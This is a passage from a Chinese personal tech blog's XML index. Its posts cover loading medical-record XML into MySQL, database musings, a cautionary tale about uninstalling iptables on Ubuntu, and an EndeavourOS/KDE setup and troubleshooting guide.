            <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">".xml"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./XMLfilename.txt"</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> path<span class="token punctuation">:</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> path<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="写入数据库">写入数据库</h2>
<p>最后是入库操作，这里为了省事直接用PyMySQL了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql
connection <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span>workstation_host<span class="token punctuation">,</span>
                             port<span class="token operator">=</span>workstation_port<span class="token punctuation">,</span>
                             user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>
                             password<span class="token operator">=</span>workstation_passwd<span class="token punctuation">,</span>
                             db<span class="token operator">=</span><span class="token string">'EMR'</span><span class="token punctuation">,</span>
                             charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
cursor <span class="token operator">=</span> connection<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'INSERT INTO `medical_EHR` (`HIS`,`Chief_complaint`) VALUES (%s, %s)'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
connection<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="其他">其他</h2>
<p>一些大段的文本，比如主诉、病史之类的后期结构化用LSTM或者Bert跑一下，这个以后再讲。</p>
<p>现在这个电子病历吧，感觉跟纸币支付宝化一样，疯狂泄露隐私等问题根本没人管，指不定哪天你个人信息全给你卖了。 以后你们到医院还是能要纸质凭据就要纸质的，回头出了什么事找医院撕逼比较好办。另，现在医保吃紧，交了很多年医保到了用的时候大概率被赖账，别被坑了找医院讨说法还被打成医闹反动分子；什么？医生不都是弱势群体白衣天使咩？啊这，你说是那就是。</p>
<blockquote>
<p>三个劫道的不如一个卖药的,三个卖药的不如一个开学校的</p>
</blockquote>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>xml</tag>
        <tag>电子病历</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL从入门到跑路</title>
    <url>/45b9/</url>
    <content><![CDATA[<p>用了这么久数据库，现在还只会增删查改，开个坑学学优化。 <span id="more"></span> 等待填坑</p>
<p>这个图比较清晰</p>
<p><img src="/45b9/db.webp" /></p>
<p>看到clickhouse的速度很快，有空看一下</p>
<h2 id="轻如鸿毛的sqlite">轻如鸿毛的SQLite</h2>
<p>好东西，在性能严重受限的开发板上跑着非常舒服，反正以前我试着感觉比另一个嵌入式数据库BerkeleyDB感觉好用多了。</p>
<p>其实我感觉很多小网站什么的，根本没必要上MySQL之类的东西，SQLite完全够了。什么存储过程啊，什么访问控制用户权限管理啊，基本上不怎么能用得到。数据量也小，那就索性连索引都不要了。 没有那一堆臃肿的东西，也没有那一堆乱七八糟的依赖。</p>
<p>而且这个东西快啊，数据量不怎么大的情况下比MySQL快，配置也简单</p>
<h2 id="你们这个是什么教材啊你们真的是害人不浅啊你们这个教材">你们这个是什么教材啊，你们真的是害人不浅啊你们这个教材</h2>
<h3 id="一张大表不好吗">一张大表不好吗</h3>
<blockquote>
<p>范式，什么范式？</p>
</blockquote>
<p>课本上这个要新建一张表，那一张表，好多个表</p>
<h3 id="隔离性">隔离性</h3>
<p>clickhouse那么快的原因就是一定程度上破坏了隔离性</p>
<h3 id="原子性">原子性</h3>
<p>MySQL在5.7以后支持了json，或许是感受到了Postgres的压力。</p>
<h2 id="好用的干活工具">好用的干活工具</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RiY2xpL215Y2xp">mycli<i class="fa fa-external-link-alt"></i></span> MySQL的cli工具，能高亮和自动补全</p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>不要尝试sudo apt remove iptables</title>
    <url>/a7d1/</url>
    <content><![CDATA[<p><img src="do-not-use-sudo-apt-remove-iptables/emmm.png" alt="Picture" style="zoom:80%;" /></p>
<span id="more"></span>
<p>在Ubuntu和Debian里卸载iptables会发生严重的后果（大佬请无视） 一开始我们觉得是防火墙把443端口给办了用不了https，结果我用UFW设置不管用，怀疑是iptables的问题，问了花花师兄，也不清楚，我们决定先把iptables禁用了。随手一谷歌，也忘了哪个神仙说的</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt</span> remove iptables <span class="token comment"># 不要乱试！</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>感觉对的嘛，卸个防火墙能出什么问题嘛<br />
然后提示是否卸载我选了y，然后突然在卸载的log发现一堆Docker，瞬间感觉不对劲。然后，然后Docker直接不能用了！ 血泪教训啊，防火墙卸了Docker就不能用了！</p>
<p>随手一搜发现不止我一个人中招啊</p>
<p><img src="do-not-use-sudo-apt-remove-iptables/iptables-docker.png" alt="Picture" style="zoom:80%;" /></p>
<p>好家伙</p>
<p><img src="do-not-use-sudo-apt-remove-iptables/cnm.png" alt="Picture" style="zoom:80%;" /></p>
<p>行吧，一堆依赖比python2还多</p>
<p>不说了，准备重装系统了<img src="do-not-use-sudo-apt-remove-iptables/mmm.jpg" alt="Picture" style="zoom:80%;" /></p>
<hr />
<p>停用iptables请使用<code>chkconfig iptables off</code>命令</p>
<hr />
<p>更新，试图垂死挣扎使用</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> network-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>既然把网卡配置删了那就再配置一遍 等会，装了NetworkManager选了默认配置之后连22端口也连不上了。。。 行吧，准备重装 <img src="do-not-use-sudo-apt-remove-iptables/wa.jpg" alt="Picture" style="zoom:80%;" /></p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>iptables</tag>
        <tag>删库跑路</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>为什么不试试EndeavourOS呢</title>
    <url>/why-not-try-endeavouros/</url>
    <content><![CDATA[<p>sudo pacman -Rs win10</p>
<span id="more"></span>
<p>其实还是建议能折腾的玩家直接上原味Arch。不想装Arch的偷懒用户可以试试这个（不过推荐想用KDE等其他桌面的玩家先选择离线安装，然后卸载xfce的包，再装其他DE。这个在线安装的时候每装一个包都会 -Syu 一下，非常慢）</p>
<h2 id="镜像源">镜像源</h2>
<p>再次更新，你电镜像源有EndeavourOS了： <span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24vZW5kZWF2b3Vyb3Mv">http://mirrors.uestc.cn/endeavouros/<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"Server = http://mirrors.tuna.tsinghua.edu.cn/endeavouros/repo/<span class="token variable">$repo</span>/<span class="token variable">$arch</span>"</span> <span class="token operator">></span> /etc/pacman.d/endeavouros-mirrorlist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>iso镜像在<span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24vZW5kZWF2b3Vyb3MvaXNvLw==">这里<i class="fa fa-external-link-alt"></i></span></p>
<p>清华已经安排上了EndeavourOS的镜像和<span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLnR1bmEudHNpbmdodWEuZWR1LmNuL2VuZGVhdm91cm9zL2lzby8=">iso<i class="fa fa-external-link-alt"></i></span>，可以方便的下载iso和更新EndeavourOS的包了。（或者用PT种子下载，实测速度均&gt;10Mb/s）</p>
<p>更改<code>/etc/pacman.d/endeavouros-mirrorlist</code>中的内容，改为</p>
<pre class="line-numbers language-config" data-language="config"><code class="language-config">## China
Server &#x3D; https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;endeavouros&#x2F;repo&#x2F;$repo&#x2F;$arch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后<code>sudo pacman -Syy</code>刷新一下</p>
<h2 id="安装virtualbox虚拟机">安装virtualbox虚拟机</h2>
<p>我用的kernel是lts版本（偶滴本本是Nvidia独显，不敢上kernel一直滚，怕炸）</p>
<p>装头文件、virtualbox组件、网络和vnc扩展（可选）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S linux-lts-headers virtualbox virtualbox-guest-iso virtualbox-host-dkms net-tools virtualbox-ext-vnc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>推荐安装oracle的增强扩展（一些自适应分辨率缩放、USB驱动什么的都在这里面）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S virtualbox-ext-oracle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后下载镜像（微软貌似出了用于虚拟机的免费90天win10，然而win10还是耗资源，没有什么特殊需求就只是用用office用用QQ什么的开个win7甚至XP虚拟机就好了，在虚拟机里会流畅一点）</p>
<p>增强功能要在win虚拟机中手动安装扩展才能用</p>
<h2 id="终端配置">终端配置</h2>
<h3 id="将bashzsh的终端输出信息和日志改回英文">将bash/zsh的终端输出信息和日志改回英文</h3>
<p>终端有些报错和输出还是要靠英文去谷歌，中文资料太少了，查不到，但是又不想把全局设置成英文的。直接<code>export LANG=en_US.UTF-8</code>不起作用，改成<code>export LANG=en_US</code>变成了英文但是中文乱码了，差了一下LANGUAGE参数的优先级比LANG要高、LC_X参数优先级比LANGUAGE高，修改LANGUAGE变量即可。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span><span class="token string">"en_US:UTF-8"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>只修改终端那就在.bashrc加上</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token environment constant">$TERM</span>"</span><span class="token operator">=</span><span class="token string">"linux"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token keyword">then</span> 
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>en_US 
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>en_US.UTF-8 
<span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="默认终端改为zsh">默认终端改为zsh</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chsh -s /usr/bin/zsh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>装oh-my-zsh（因为我懒得自己配置zsh了）和插件，并设置默认终端为oh-my-zsh</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S <span class="token function">zsh</span> oh-my-zsh-git autojump zsh-autosuggestions zsh-syntax-highlighting
chsh -s /usr/bin/zsh
<span class="token function">cp</span> /usr/share/oh-my-zsh/zshrc ~/.zshrc <span class="token comment"># 我比较懒，就直接把默认配置拿过来改改</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="更换lts内核">更换lts内核</h2>
<p>更新到5.8以后我的virtualbox又出问题了，换回linux-lts</p>
<p>EndeavourOS有一个叫akm的图形界面，但是你要手动重装virtualbox之类的会受到内核影响的东西。</p>
<h2 id="显卡驱动">显卡驱动</h2>
<blockquote>
<p>so, nvidia f.....</p>
</blockquote>
<p>算了，3080那么强，不黑英伟达了(更新，AMD新卡出了，好家伙</p>
<p>他们从以前Antergos那fork了一个驱动安装脚本，有个包叫nvidia-installer（lts等用户请用nvidia-installer-dkms），看<span class="exturl" data-url="aHR0cHM6Ly9lbmRlYXZvdXJvcy5jb20vZG9jcy9oYXJkd2FyZS1hbmQtbmV0d29yay9ncmFwaGljLWNhcmRzLWdwdS1kcml2ZXItYW5kLXNldHVwLw==">这里<i class="fa fa-external-link-alt"></i></span>。</p>
<h2 id="桌面环境">桌面环境</h2>
<p>EndeavourOS官方魔改定制了xfce的主题和图标，离线安装镜像也只有xfce，其他的几乎没怎么魔改。</p>
<p>如果要装其他DE的话</p>
<p>紫红配色看个人喜好吧，其实我不太能欣赏的来（这个配色，Gitlab同款）</p>
<p>更新，KDE 的 5.20.2 配色和EndeavourOS完全一致，建议他们火速从XFCE迁往KDE（不是</p>
<figure>
<img src="/why-not-try-endeavouros/image-20201031190318540.png" alt="KDE新官网样子" /><figcaption aria-hidden="true">KDE新官网样子</figcaption>
</figure>
<p>多桌面环境可能出问题，非要这样做的话建议每个不同的桌面环境分配一个单独的用户名。 （貌似xfce4和KDE一起用几乎问题（用ssdm），先装ssdm和KDE,然后装xfce4） 尝试了一下i3wm, 简洁是真的简洁，不太习惯又删了换回KDE了。</p>
<p>KDE有一种 Windows Vista 的感觉，感觉是 linux 所有 Desktop Enviroment 里面最舒服的。xfce虽然是EndeavourOS默认的DE，但是xfce开发人手不够，用户和社区贡献者也比KDE少，而且内存占用最新的KDE已经比xfce低了.....现在xfce也不怎么轻量了，渣配置机器上表现没有LXDE好，感觉不少用户都转去用i3wm和KDE了...逐渐没落的夕阳DE，适合养老</p>
<h2 id="硬盘扩容和迁移">硬盘扩容和迁移</h2>
<p>趁打折买了一块西数SN550,之前只有500G还装了个双系统的笔记本可以扩容了</p>
<p>现在把/home分区（大概60G）从老硬盘移动到新硬盘上，空出来的60G给/目录。我既不是LVM也没有组raid，文件系统用的ext4，500G老硬盘分了400G给win10,剩下100G给了linux，分了一个/，40G,一个/home，60G</p>
<p>先格式化（这里我用的GPT分区表，ext4），然后挂载到/mnt,然后用rsync迁移/home下的文件到/mnt 然后umount，然后分区合并给/root，再挂载到/home下面</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">fdisk</span> -l
yay -Sy <span class="token function">rsync</span>

mkfs.ext4 /dev/nvme0n1p1
<span class="token function">mount</span> /dev/nvme0n1p1 /mnt
<span class="token function">rsync</span> -avz /home /mnt
<span class="token function">umount</span> dev//nvme0n1p1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>两边都是nvme,2分钟就同步完成了，速度非常感人，然后修改fstab，将原来/home分区的uuid改为新硬盘的（/dev/nvme0n1p1）uuid</p>
<p><code>/etc/fstab</code>大概长这个样子，分别是uuid,挂载目录，文件类型，noatime后面0表示不开机自检，/</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">UUID</span><span class="token operator">=</span><span class="token number">8205</span>-8BC5                            /boot/efi      vfat    <span class="token assign-left variable">umask</span><span class="token operator">=</span>0077 <span class="token number">0</span> <span class="token number">2</span>
<span class="token assign-left variable">UUID</span><span class="token operator">=</span><span class="token number">36499174</span>-6a4a-4b9d-b5cc-0b1f555a1f46 /              ext4    defaults,noatime <span class="token number">0</span> <span class="token number">1</span>
<span class="token assign-left variable">UUID</span><span class="token operator">=</span>bf5e768c-a2de-4618-9861-5946459a69b6 /home          ext4    defaults,noatime <span class="token number">0</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后退出来，用livecd或者双系统的分区工具把原来的/home分区删掉分给原来的/目录。（注意做好备份不要删错了，删错了就没了）</p>
<p>再次登陆后应该就行了。弄完突然发现KDE自带一个叫KDE Partition Manager的工具，看起来貌似还行。</p>
<h2 id="修grub">修grub</h2>
<p>双系统grub又出问题了，好在用liveusb重装了一下grub问题救了回来。</p>
<p>我是UEFI，操作除了最后 grub install 用EndeavourOS的，其他的和Arch一样</p>
<p>先挂载，然后chroot进去，然后重装grub</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> /dev/nvme0n1p3 /mnt
<span class="token function">mount</span> /dev/nvme1n1p2 /mnt/boot/efi
<span class="token function">grub-mkconfig</span> -o /boot/grub/grub.cfg
grub-install --target<span class="token operator">=</span>x86_64-efi --efi-directory<span class="token operator">=</span>/boot/efi --bootloader-id<span class="token operator">=</span>EndeavourOS-grub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="滚动升级">滚动升级</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -Syu <span class="token comment"># 装了AUR就yay -Syu</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果要自动降级新软件包就<code>-Syuu</code>(不推荐)</p>
<p>升级的包里面有内核和显卡驱动的时候要注意小心</p>
<p>升级内核之后最好重启一下，有的时候不重启会遇到开bbr失败了啊，u盘读不出来了啊，就比如<span class="exturl" data-url="aHR0cHM6Ly9qbGljZS50b3AvcC83bDltby8=">记因内核版本错误导致U盘不能识别的问题解决<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly92MmV4LmNvbS90LzMyMzU1OQ==">这个v站帖子<i class="fa fa-external-link-alt"></i></span>还有重启后<span class="exturl" data-url="aHR0cHM6Ly9tYW5hdGVlbGF6eWNhdC5naXRodWIuaW8vbGludXgvMjAyMC8wMi8xNC9maXgtYXJjaC1ib290LWZhaWxlZC5odG1s">Grub内核版本号不升级<i class="fa fa-external-link-alt"></i></span>，大部分情况下<code>modprobe</code>找不到模块八成就是了</p>
<h3 id="升级内核不重启">升级内核不重启</h3>
<p>参考reddit这个<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2FyY2hsaW51eC9jb21tZW50cy80enJzYzMva2VlcF95b3VyX3N5c3RlbV9mdWxseV9mdW5jdGlvbmFsX2FmdGVyX2Ffa2VybmVsLw==">帖子<i class="fa fa-external-link-alt"></i></span></p>
<p>一个软链过去，感觉不太优雅，还是乖乖重启比较好</p>
<blockquote>
<p>看来包管理器们应该学习其他两个系统，统一在关机开机的时候更新软件。</p>
</blockquote>
<h2 id="kde使用事项">KDE使用事项</h2>
<h3 id="kde卡死的抢救方案">KDE卡死的抢救方案</h3>
<p>KDE现在已经比较稳定了，但是Linux桌面程序还是偶尔把桌面搞到卡死，比如vscode内存泄漏。</p>
<p>首先尝试<code>ctl+alt+t</code>呼出终端，如果不能就<code>ctl+alt+F2</code>调出tty，htop看一下那个进程占用高，kill掉，如果不行就重启tty</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kquitapp5 plasmashell <span class="token operator">&amp;&amp;</span> kstart5 plasmashell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>正常退出不行就直接killall</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">killall</span> plasmashell <span class="token operator">&amp;&amp;</span> kstart5 plasmashell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者重启一下SDDM</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart sddm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>还不行就杀掉tty1，然后重启xorg</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> tty1 <span class="token comment"># 或者pgrep tty1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后kill掉（或者直接<code>pkill -9 -t tty1</code>），重启 或者直接</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">pkill</span> x
startx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>再不行直接<code>reboot</code>就好了</p>
<p>或许你开了SysRq，先用SysRq抢救一下，见<span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC9sYXRlc3QvYWRtaW4tZ3VpZGUvc3lzcnEuaHRtbA==">Linux Magic System Request Key Hacks<i class="fa fa-external-link-alt"></i></span>，或者直接看<span class="exturl" data-url="aHR0cDovL2Jsb2cubHVqdW45OTcyLndpbi9ibG9nLzIwMTgvMDgvMjIvbGludXjkuIvnmoRzeXNycemUri9pbmRleC5odG1s">linux下的SysRq键<i class="fa fa-external-link-alt"></i></span></p>
<p>再不行就直接尝试长按电源关机了</p>
<h3 id="混成器">混成器</h3>
<p>有Nvidia显卡怕驱动更新出问题可以在设置中将渲染器（混成器）从OpenGL改为XRender，XRender出问题的情况会少一点，虽然很多特效都不支持，性能也略差。没有问题建议还是用OpenGL或者直接关闭特效，XRender没有硬件加速用起来感觉跟OpenGL有明显的体验差距。</p>
<p>另外貌似非整数比缩放的时候透明特效之类的经常不支持，建议直接关了。</p>
<h3 id="baloo">baloo</h3>
<p>禁用baloo：<code>balooctl disable</code> 这个文件索引服务也是个吃性能大户，不管是在GNOME下还是KDE下。可以考虑禁用。要查找文件可以用find命令之类的东西嘛。</p>
<h3 id="kde桌面部件">KDE桌面部件</h3>
<p>美化要稍微谨慎一点，魔改太多了不太稳定</p>
<p>latte-dock：虽然KDE官方维护支持这个，动画效果很漂亮，用起来也很舒服，但是这个实在是吃内存大户。KDE桌面不开多余特效和装各种桌面部件待机内存在300M，装个latte-dock后内存占用比其他所有的加起来还多。把dock的鼠标悬停放大之类的特效关一关。貌似这个的背景透明只有XRender支持。</p>
<p>一个很喜欢的任务栏部件event calendar</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S plasma5-applets-eventcalendar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="双显示器开机右侧出现黑边">双显示器开机右侧出现黑边</h3>
<p>发现是每次开机分辨率变成1680*1050了</p>
<p>先看一下你的显示器编号</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xrandr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>比如我的就是DVI-I-1和DVI-D-0，把这两个分辨率改回1080p</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xrandr --output DVI-I-1 --mode 1920x1080 --rate <span class="token number">60</span>
xrandr --output DVI-D-0 --mode 1920x1080 --rate <span class="token number">60</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这里有一个自动配置的包<span class="exturl" data-url="aHR0cHM6Ly93d3cuYXJjaGxpbnV4Lm9yZy9wYWNrYWdlcy8/bmFtZT1hdXRvcmFuZHI=">autorandr<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S autorandr
autorandr horizontal <span class="token operator">&amp;&amp;</span> autorandr vertical <span class="token comment"># 这里我直接把显示长宽分辨率都直接拉满了</span>
autorandr --save test1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>或者你可以手动编辑<code>/etc/X11/xorg.conf.d</code>下的配置</p>
<p>见<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1hyYW5kcg==">Arch Wiki xrandr<i class="fa fa-external-link-alt"></i></span></p>
<p>其实每次开机运行一下xrandr可能更好一点（如果你不是wayland的话），不少人都是这么搞得（顺便刷新调整一下字体啥的</p>
<figure>
<img src="/why-not-try-endeavouros/image-20200923222725926.png" alt="xrandr" /><figcaption aria-hidden="true">xrandr</figcaption>
</figure>
<h2 id="macwin10上的一些软件">Mac/win10上的一些软件</h2>
<p><del>请阅读王垠经典博文完全用linux工作</del> 不少时候用wine还是能搞定的（如果你不在乎wine的稳定性的话），包括一些大型软件，比如PS 当然有的东西用wine体验远没有虚拟机好，拿Virtualbox或者KVM开个虚拟机是个不错的选择。或者身边有闲置安卓机用scrcpy投屏，或者KDE Connect传文件。</p>
<p>部分国产软件开个黑果虚拟机感觉体验比windows虚拟机略好一点 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZveGxldC9tYWNPUy1TaW1wbGUtS1ZN">https://github.com/foxlet/macOS-Simple-KVM<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="一点闲话">一点闲话</h2>
<p>其实我一直很期待Arch系诞生一批用户友好的桌面发行版，就像Debian那样衍生出Ubuntu、Linux Mint那样。（虽然这很不Arch）</p>
<ol type="1">
<li>之前被apt的地狱依赖搞得心态崩了，想用pacman系的（反正打包粒度粗一点好，硬盘现在这么便宜又不在乎占多大地方）</li>
<li>喜欢KDE</li>
<li>想要稳定一点的系统做日常主力搬砖用</li>
<li>安装方便一点。这个倒是无所谓，不过出了事LiveCD抢救也想有个图形界面方便抢修</li>
</ol>
<p>Arch把wifi-menu去掉之后就不太想用原味Arch了，我这笔记本没网口高通网卡Nividia独显实在八字不合，只想佛系地找个好装的iso</p>
<p>KaOS基本符合，然而包太少（加上KCP社区包也还是很少），可惜.... 另一个<span class="exturl" data-url="aHR0cHM6Ly93d3cuY2hha3JhbGludXgub3JnLw==">chakra<i class="fa fa-external-link-alt"></i></span>也是包太少（这个有自己的CCR社区包，包也不多），KDE和Qt骨灰爱好者的宝藏，软件基本全套KDE和Qt（不过据说他们人手不够维护不过来了打算换到）</p>
<p>此外还有各种层出不穷的真*Arch安装器 <span class="exturl" data-url="aHR0cHM6Ly9maXJlcmFpbi5tZS8=">https://firerain.me/<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9nYXJ1ZGFsaW51eC5vcmcvaW5kZXguaHRtbA==">https://garudalinux.org/index.html<i class="fa fa-external-link-alt"></i></span></p>
<p>Antergos的继承者，EndeavourOS满足了前两点，貌似xfce主题魔改了点主题，KDE基本原封不动。当时Manjaro闹分裂，jonathon出走了，我也跟着跑路到了这个发行版;用了一段时间感觉还不错，接近原味Arch, 不像Manjaro一样整了很多超出自己驾驭能力的魔改。推荐各位Manjaro用户和想用pacman又嫌麻烦的用户尝试一下。 现在看win10反而不习惯，索性把教研室搬砖那台win10全格了只装这个（要用到windows的时候上win7虚拟机 ps. win7 和KDE好像啊）</p>
<p>那天还看到肥猫跑到Manjaro群里推这个</p>
<p><img src="/why-not-try-endeavouros/miao.png" /></p>
<p>第二天welcome就有了中文，感动</p>
<p><img src="/why-not-try-endeavouros/miaomiao.png" /></p>
<p>能制止Manjaro的不是Arch佬的疯狂洗手，是另一个比Manjaro更好的Arch简易安装器，EndeavourOS合格了。</p>
<p>最后，不要对EndeavourOS抱有过高的期待，感觉他们人手还是不太足。</p>
<p>不过大方向是走对了，基本上就做做开箱即用和一些代替命令操作的图形界面，没有像Manjaro那样各种魔改搞出很多Arch上反而没有的问题。就比如linux内核切换的图形界面akm，基本上就是代替了archwiki上的手动操作，选项也只有linux,linux-lts,linux-zen几个。不像Manjaro那个内核切换，从linux 5.3 到linux 5.8最新版全都有，非常奔放，你要是真随便选一个linux和linux-lts之外的，哪天滚着滚着就出问题了。</p>
<p><img src="/why-not-try-endeavouros/akm.png" /></p>
<p>Arch的安装脚本和只是换了个皮的安装器层出不穷，目前看来EndeavourOS是最令人满意的一个（好吧，默认是xfce，这个离线装了然后改DE就好了）</p>
<h2 id="最后">最后</h2>
<p>AUR包数量很庞大，但也有一些包目前还没有，有精力和意愿打包的可以去给AUR提交打包 可以参看</p>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly9hdXIuYXJjaGxpbnV4Lm9yZy8=">Archlinux User Repository<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0NyZWF0aW5nX3BhY2thZ2Vz">Creating packages<i class="fa fa-external-link-alt"></i></span></li>
